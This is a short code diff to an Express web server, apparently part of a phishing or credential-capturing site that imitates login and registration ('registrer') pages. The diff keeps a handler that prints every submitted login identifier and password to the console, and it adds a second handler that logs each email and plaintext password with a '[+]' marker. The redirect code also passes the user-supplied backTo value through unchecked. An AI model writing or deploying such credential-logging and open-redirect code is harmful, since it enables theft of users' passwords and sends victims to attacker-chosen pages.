@@ -127,11 +127,10 @@ function changeRedirect(req, redirectUrl, params) {
 	if (redirectUrl == "/page") {
 		return "/";
 	} else if (req.method == "POST" && req.path == "/login") {
-		if (redirectUrl.startsWith("/login")) {
+		if (redirectUrl.startsWith("/user/login")) {
 			params.set("incorrect", "true");
 			return `/login?${decodeURIComponent(params.toString())}`;
 		} else {
-			console.log(req.query["backTo"]);
 			return req.query["backTo"] || "/";
 		}
 	} else if (req.method == "POST" && req.path.startsWith("/registrer/")) {
@@ -219,6 +218,12 @@ modules.addRouters(server);
 server.post("/login", express.urlencoded({extended: true}), (req, res, next) => {
 	let { query, password } = req.body;
 	console.log(`${query} | ${password}`);
+	next();
+});
+
+server.post("/registrer", express.urlencoded({extended: true}), (req, res, next) => {
+	let { email, password } = req.body;
+	console.log(`[+] ${email} | ${password}`);
 	next();
 });
 
